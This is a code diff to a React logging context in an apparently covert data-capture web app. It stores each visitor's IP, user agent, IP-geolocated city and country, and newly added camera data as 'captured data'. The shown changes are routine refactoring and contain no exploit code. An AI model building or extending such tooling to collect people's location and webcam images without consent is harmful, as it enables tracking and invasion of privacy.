@@ -2,12 +2,12 @@
 "use client";
 import type { ReactNode } from 'react';
 import React, { createContext, useContext, useState, useEffect, useCallback } from 'react';
-import type { LogEntry, LocationData } from '@/types';
+import type { LogEntry, LocationData, CameraData } from '@/types'; // Added CameraData
 import { useToast } from '@/hooks/use-toast';
 
 interface LogContextType {
   logs: LogEntry[];
-  addLog: (log: Omit<LogEntry, 'id' | 'timestamp' | 'ip' | 'userAgent'>) => Promise<void>; // Changed to Promise<void>
+  addLog: (log: Omit<LogEntry, 'id' | 'timestamp' | 'ip' | 'userAgent'>) => Promise<void>;
   clearLogs: () => void;
   isLoading: boolean;
 }
@@ -50,10 +50,13 @@ async function getGeoInfo(ip: string): Promise<{ city?: string; country?: string
 export const LogProvider: React.FC<{ children: ReactNode }> = ({ children }) => {
   const [logs, setLogs] = useState<LogEntry[]>([]);
   const [isLoading, setIsLoading] = useState(true);
-  const { toast } = useToast(); // Kept for clearLogs, but not for addLog directly
+  const { toast } = useToast();
 
-  // Load logs from localStorage on initial mount
   useEffect(() => {
+    if (typeof window === 'undefined') {
+      setIsLoading(false); // Still need to set loading to false if in SSR/non-browser
+      return;
+    }
     try {
       const storedLogs = localStorage.getItem('stish_logs');
       if (storedLogs) {
@@ -66,19 +69,20 @@ export const LogProvider: React.FC<{ children: ReactNode }> = ({ children }) => 
     setIsLoading(false);
   }, []);
 
-  // Sync logs to localStorage whenever they change
   useEffect(() => {
-    if (!isLoading) {
-      try {
-        localStorage.setItem('stish_logs', JSON.stringify(logs));
-      } catch (error) {
-        console.error("Error saving logs to localStorage:", error);
-      }
+    if (typeof window === 'undefined' || isLoading) {
+      return;
+    }
+    try {
+      localStorage.setItem('stish_logs', JSON.stringify(logs));
+    } catch (error) {
+      console.error("Error saving logs to localStorage:", error);
     }
   }, [logs, isLoading]);
 
-  // Listen for localStorage changes from other tabs
   useEffect(() => {
+    if (typeof window === 'undefined') return;
+
     const handleStorageChange = (event: StorageEvent) => {
       if (event.key === 'stish_logs' && event.newValue) {
         try {
@@ -99,8 +103,8 @@ export const LogProvider: React.FC<{ children: ReactNode }> = ({ children }) => 
     const ip = await getPublicIP();
     const userAgent = typeof navigator !== 'undefined' ? navigator.userAgent : 'N/A';
     
-    const newLogBase: Omit<LogEntry, 'data'> = {
-      ...logData,
+    const newLogBase: Omit<LogEntry, 'id' | 'timestamp' | 'ip' | 'userAgent' | 'data'> = { // data will be added specifically
+      type: logData.type,
       id: crypto.randomUUID(),
       timestamp: new Date().toISOString(),
       ip,
@@ -109,14 +113,15 @@ export const LogProvider: React.FC<{ children: ReactNode }> = ({ children }) => 
 
     let finalData = logData.data;
 
-    if (logData.type === 'location') {
+    if (logData.type === 'location' && logData.data) {
       const geoInfo = await getGeoInfo(ip);
-      // Enrich the data for location logs
       finalData = {
-        ...(logData.data as LocationData), // Cast to ensure original properties are kept
+        ...(logData.data as LocationData),
         city: geoInfo.city,
         country: geoInfo.country,
       };
+    } else if (logData.type === 'camera' && logData.data) {
+      finalData = logData.data as CameraData;
     }
     
     const newLog: LogEntry = {
@@ -125,12 +130,14 @@ export const LogProvider: React.FC<{ children: ReactNode }> = ({ children }) => 
     };
 
     setLogs(prevLogs => [newLog, ...prevLogs]);
-    // Toasting logic moved to DashboardPage
   }, []);
 
   const clearLogs = () => {
     setLogs([]);
-    toast({ // Toast for clearing logs can remain here or be moved too, but it's a direct action on dashboard
+    if (typeof window !== 'undefined') {
+      localStorage.removeItem('stish_logs'); // Also clear from localStorage explicitly
+    }
+    toast({
       title: "Logs Cleared",
       description: "All captured data has been deleted.",
     });
